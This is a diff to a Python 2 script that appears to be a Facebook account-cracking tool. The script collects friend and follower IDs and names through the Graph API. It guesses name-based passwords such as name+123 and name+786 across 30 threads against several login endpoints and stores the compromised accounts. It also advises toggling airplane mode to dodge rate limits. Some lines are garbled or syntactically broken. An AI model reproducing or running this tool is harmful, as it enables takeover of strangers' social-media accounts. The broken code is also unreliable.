@@ -98,17 +98,17 @@ def menu():
 		exit(" ! tidak ada koneksi internet")
 	logo()
 	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
-	print(" 1 crack from public friends")
-	print(" 2 crack from followrs")
-	print(" 3 crack from mass target")
-	print(" 4 check  crack results")
-	print(" 5 get user agent")
-	print(" 0 exit (remove token)")
+	print(" 1 Target From public/Friends")
+	print(" 2 Target From followers")
+	print(" 3 Target From public/Posts")
+	print(" 4 check result crack")
+	print(" 5 Get user agent")
+	print(" 0 keluar (hapus token)")
 	angga = raw_input("\n ? choose : ")
 	if angga =="":
 		menu()
-	 target ID == "1" any public == "01":
-		public()
+	elif angga == "1" or angga == "01":
+		publik()
 		method()
 	elif angga == "2" or angga == "02":
 		follower()
@@ -117,14 +117,14 @@ def menu():
 		massal()
 		method()
 	elif angga == "4" or angga == "04":
-		Results("\n 1 check  crack OK")
-		Results(" 2 Check  crack CP")
+		print("\n 1 cek hasil crack OK")
+		print(" 2 cek use crack CP")
 		cek = raw_input("\n ? choose : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
 			dirs = os.listdir("OK")
-			print(" * list nama file tersimpan di folder OK")
+			print(" * list name file tersimpan di folder OK")
 			for file in dirs:
 				print(" + "+file)
 			try:
@@ -220,30 +220,31 @@ def massal():
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
-				Welcome = i["Wahid"].rsplit(" ")[0]
-				id.append(uid+"<=>"+Wahid)
+				nama = i["name"].rsplit(" ")[0]
+				id.append(uid+"<=>"+nama)
 		except KeyError:
 			print(" ! akun tidak tersedia atau list teman private")
 	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id)))
 
 def method():
 	print(" \n [ pilih method crack - coba method satu² ]\n")
-	print(" 1 Target ID b-api  (fast crack)")
-	print(" 2 Target ID mbasic (slow crack)")
-	print(" 3 Targe ID mobile (slow crack)")
+	print(" 1 method b-api  (Fast Crack)")
+	print(" 2 method mbasic (slow crack)")
+	print(" 3 method mobile (Free Crack)")
 	method = raw_input("\n ? method : ")
-	if method == "":
+	Choice == "":
 		menu()
 	elif method == "1":
 		ask = raw_input(" ? Use password manual? y/t: ")
 		if ask == "y":
 			manual()
-		print("\n + Results OK  tersimpan : OK/%s.txt"%(tanggal))
-		print(" + Results CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! if no result turn on airplane mode 5 seconds\n")
 		ThreadPool(30).map(bapi, id)
 		exit("\n\n # selesai...")
 	elif method == "2":
-		ask = raw_input(" ? gunakan password manual? y/t: ")
+		ask = raw_input(" ? Use password manual? y/t: ")
 		if ask == "y":
 			manual()
 		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
@@ -252,11 +253,12 @@ def method():
 		ThreadPool(30).map(mbasic, id)
 		exit("\n\n # selesai...")
 	elif method == "3":
-		ask = raw_input(" ? gunakan password manual? y/t: ")
+		ask = raw_input(" ? Use password manual? y/t: ")
 		if ask == "y":
 			manual()
-		print("\n + Results OK tersimpan di : OK/%s.txt"%(tanggal))
-		print(" + Results CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
 		ThreadPool(30).map(mobile, id)
 		exit("\n\n # selesai...")
 	else:
@@ -282,20 +284,20 @@ def bapi(user):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		ua = ("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36;]")
 	global loop, token
 	sys.stdout.write(
 		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345" ]
+		pwx = [ ludostar1, name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"1", name+"12345" ]
 	else:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"786", name+"123456" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -334,9 +336,9 @@ def mbasic(user):
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"1", name+"1234567" ]
 	else:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"786", name+"123456" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -388,7 +390,7 @@ def mobile(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"1", name+"123456" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
